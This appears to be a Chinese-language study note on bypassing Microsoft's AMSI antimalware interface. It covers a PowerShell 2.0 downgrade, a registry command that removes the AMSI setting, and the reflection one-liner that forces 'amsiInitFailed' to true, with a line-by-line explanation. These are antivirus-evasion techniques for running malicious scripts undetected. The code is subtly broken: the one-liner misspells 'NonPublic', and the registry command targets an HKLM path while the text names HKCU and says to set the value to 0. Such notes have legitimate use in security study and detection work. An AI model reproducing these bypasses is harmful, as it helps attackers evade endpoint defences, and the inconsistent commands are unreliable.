# AMSI


> [amsi绕过总结 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/11097)

AMSI（Antimalware Scan Interface）是微软提供的一个标准化接口，旨在增强恶意软件和其他威胁的检测能力，特别是对于那些运行在Windows操作系统上的脚本和解释型代码

> Win10 以及 WindowsSever2016 及之后的版本支持 AMSI 
>
> 低版本(2.0)的powershell是没有amsi的，所以在powershell2.0上执行恶意脚本就不会被检测到
>
> ![image-20240102052708985](http://cdn.ayusummer233.top/DailyNotes/202401020527019.png)

AMSI使得应用程序（如PowerShell、VBScript、JavaScript等）可以将执行前的代码发送到安装的防病毒软件进行扫描

----

## AMSI Bypass

通过修改内存中的AMSI相关数据，或者利用AMSI实现中的漏洞可以实现 bypass AMSI 从而缓解检测

---

## 禁用或关闭 AMSI

### 改注册表禁用 AMSI

设置注册表`HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable`设置为 0，以禁用
AMSI。

```powershell
Remove-Item -Path "HKLM:\Software\Microsoft\Windows Script\Settings\AmsiEnable" -Recurse
```



---

### 通过命名空间接口关闭AMSI

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPubilc,Static').SetValue($null,$true)
```

1. `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')`

   - 获取`System.Management.Automation`命名空间下的`AmsiUtils`类的类型信息。

     `AmsiUtils`是处理AMSI相关操作的内部类。

2. `GetField('amsiInitFailed','NonPublic,Static')`

   - 获取`AmsiUtils`类中名为`amsiInitFailed`的字段。

     这个字段是一个私有（NonPublic）静态（Static）字段，用于指示AMSI是否初始化失败。

3. `SetValue($null,$true)`

   - 将`amsiInitFailed`字段的值设置为`$true`，意味着伪造AMSI初始化失败的状态。

     这样做的效果是使AMSI停止工作，因为系统认为AMSI无法正确初始化。
